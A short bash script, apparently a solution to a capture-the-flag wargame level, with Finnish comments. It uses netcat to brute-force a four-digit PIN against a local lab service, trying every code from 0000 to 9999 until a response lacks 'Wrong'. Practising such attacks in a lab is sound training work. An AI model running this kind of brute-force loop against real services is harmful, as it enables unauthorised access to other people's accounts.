#!/bin/bash

coproc CONNECTION { nc localhost 30002; }

# ensimmäinen vastaus
read -r ret <&"${CONNECTION[0]}"
echo "$ret"

for i in $(seq -w 0000 9999); do
    echo "bandit24password $i" >&"${CONNECTION[1]}"

    # vastauksen virheentarkistus
    if ! read -r -t 5 ret <&"${CONNECTION[0]}"; then
        echo "Reading response failed"
        break
    fi

    # vastauksen tarkistaminen ja oikean tulostaminen
    if ! grep -Fq "Wrong" <<< "$ret"; then
        echo "PIN: $i"
        echo "$ret"

        while IFS= read -r -t 5 line; do
            echo "$line"
        done <&"${CONNECTION[0]}"
        break
    fi
done